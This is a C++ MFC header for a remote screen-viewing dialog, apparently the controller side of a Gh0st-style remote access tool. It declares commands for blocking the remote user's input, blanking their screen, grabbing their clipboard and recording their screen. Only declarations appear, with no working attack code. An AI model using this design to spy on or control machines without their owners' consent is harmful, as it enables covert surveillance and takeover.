#pragma once

#include "CursorInfo.h"
#include "BmpToAviDif.h"
#include "jpeglib.h"
/////////////////////////////////////////////////////////////////////////////
// CQuickScreenSpyDlg dialog
#ifdef _DEBUG
#pragma comment(lib, "turbojpeg_32_d.lib")

#else
#pragma comment(lib, "turbojpeg_32_r.lib")

#endif

enum
{
	TOKEN_FIRSTSCREEN_QUICK,
	TOKEN_NEXTSCREEN_QUICK,
	TOKEN_CLIPBOARD_TEXT_QUICK,
	TOKEN_SIZE_QUICK,
	COMMAND_NEXT_QUICK,
	COMMAND_FLUSH_QUICK,
	COMMAND_SCREEN_RESET_QUICK,
	COMMAND_SCREEN_FPS_QUICK,
	COMMAND_SCREEN_BLOCK_INPUT_QUICK,
	COMMAND_SCREEN_BLANK_QUICK,
	COMMAND_SCREEN_CAPTURE_LAYER_QUICK,
	COMMAND_SCREEN_GET_CLIPBOARD_QUICK,
	COMMAND_SCREEN_CONTROL_QUICK,
	COMMAND_SCREEN_SET_CLIPBOARD_QUICK,
	COMMAND_SCREEN_ALGORITHM_HOME,
	COMMAND_SCREEN_ALGORITHM_XVID,
	COMMAND_SCREEN_ALGORITHM_RESET,
	COMMAND_COMMAND_SCREEN_UALITY60,
	COMMAND_COMMAND_SCREEN_UALITY85,
	COMMAND_COMMAND_SCREEN_UALITY100,
};





class CQuickScreenSpyDlg : public CDialog
{
	// Construction
public:
	void OnReceiveComplete();
	void OnReceive();
	CQuickScreenSpyDlg(CWnd* pParent = NULL, ISocketBase* pIOCPServer = NULL, ClientContext* pContext = NULL);   // standard constructor

// Dialog Data
	//{{AFX_DATA(CQuickScreenSpyDlg)
	enum { IDD = IDD_SCREEN };
	// NOTE: the ClassWizard will add data members here
//}}AFX_DATA

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CQuickScreenSpyDlg)
public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	virtual void OnCancel();
	virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
	//}}AFX_VIRTUAL

// Implementation
protected:
	BOOL m_bOnClose;
	PBYTE pDeCompressionData;
	// Generated message map functions
	//{{AFX_MSG(CQuickScreenSpyDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	//afx_msg void OnClose();

	void DoPaint();
	afx_msg void OnPaint();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG

	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;
	//CRITICAL_SECTION m_cs;
	//CLCS m_clcs;
	CString m_aviFile; // 录像文件名。如果文件名不为空就写入
	CBmpToAvidif	m_aviStream;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;
	long long alldata;
	UINT m_nCountHeart;
	LPVOID	m_lpvRectBits;
	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	BYTE	m_LastCursorIndex;
	DWORD nUnCompressLength_first;
	void DrawFirstScreen(PBYTE pDeCompressionData, unsigned long	destLen);
	void DrawNextScreenHome(PBYTE pDeCompressionData, unsigned long	destLen);	
	bool JPG_BMP(int cbit, void* input, int inlen, void* output);
	void ResetScreen();
	void SendResetScreen(int nBitCount);
	void SendResetScreenFps(int nfps);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	void SendResetAlgorithm(UINT nAlgorithm);
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsCtrl;
	void SendCommand(MSG* pMsg);

	//自适应
	CRect rect;
	double           m_wZoom;            // 屏幕横向缩放比
	double           m_hZoom;            // 屏幕纵向缩放比
	MYtagMSG* m_MYtagMSG;
	int m_MYtagMSGsize;
	RECT m_rect;


};
